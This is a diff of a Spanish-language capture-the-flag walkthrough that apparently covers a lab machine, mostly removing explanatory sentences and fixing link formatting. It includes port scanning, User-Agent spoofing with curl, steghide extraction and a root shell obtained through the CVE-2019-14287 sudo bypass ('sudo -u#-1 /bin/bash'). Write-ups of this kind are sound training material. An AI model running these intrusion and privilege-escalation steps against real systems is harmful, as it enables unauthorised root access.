@@ -40,9 +40,6 @@ Para ello se utilizó un **script propio en Python** que automatiza distintas fa
 
 ```bash
 python nmap_script.py 10.66.130.189
-
-# opción 1: escaneo completo de puertos
-
 ```
 
 El script ejecuta internamente el siguiente comando:
@@ -79,13 +76,13 @@ Al acceder al sitio web se presenta el siguiente mensaje:
 Se prueba modificar el **User-Agent** con curl:
 
 ```bash
-curl -A "user-agent" [http://10.66.130.189](http://10.66.130.189)
+curl -A "user-agent" http://10.66.130.189
 ```
 
 Inicialmente no se obtiene información relevante. La pista clave es seguir las redirecciones con la opción `-L`.
 
 ```bash
-curl -A "C" -L [http://10.66.130.189](http://10.66.130.189)
+curl -A "C" -L http://10.66.130.189
 ```
 
 > Attention chris,
@@ -190,11 +187,7 @@ La passphrase obtenida es:
 
 ## Fase 7: Decodificación y Nuevas Credenciales {#fase-7-decodificación-y-nuevas-credenciales}
 
-El ZIP contiene una carta con el texto codificado `QXJlYTUx`.
-
 {{< figure src="/images/to-agent-r-zip.png" >}}
-
-Se identifica como Base64:
 
 ```bash
 echo QXJlYTUx | base64 -d
@@ -211,8 +204,6 @@ Esta contraseña se utiliza con **steghide** sobre la imagen restante, obteniend
 
 ## Fase 8: Acceso como James {#fase-8-acceso-como-james}
 
-Se accede al sistema vía SSH y se enumeran los archivos del directorio home.
-
 {{< figure src="/images/enum-james.png" >}}
 
 Se obtiene la primera flag `user.txt`.
@@ -220,18 +211,12 @@ Se obtiene la primera flag `user.txt`.
 
 ## Fase 9: Investigación de la Imagen Alien {#fase-9-investigación-de-la-imagen-alien}
 
-Se descarga la imagen encontrada mediante **rsync**.
-
 {{< figure src="/images/rsync-to-alien.png" >}}
-
-Mediante **Google Reverse Image Search** se identifica el incidente como el **Roswell Incident**.
 
 {{< figure src="/images/google-image-search.png" >}}
 
 
 ## Fase 10: Escalada de Privilegios {#fase-10-escalada-de-privilegios}
-
-Antes de usar herramientas automáticas, se ejecuta:
 
 ```bash
 sudo -l
@@ -239,11 +224,7 @@ sudo -l
 
 {{< figure src="/images/sudo-dash-l.png" >}}
 
-La configuración revela la vulnerabilidad **CVE-2019-14287**, que permite ejecutar comandos como root usando UID `-1`.
-
 {{< figure src="/images/meme.jpg" >}}
-
-Se obtiene una shell privilegiada:
 
 ```bash
 sudo -u#-1 /bin/bash
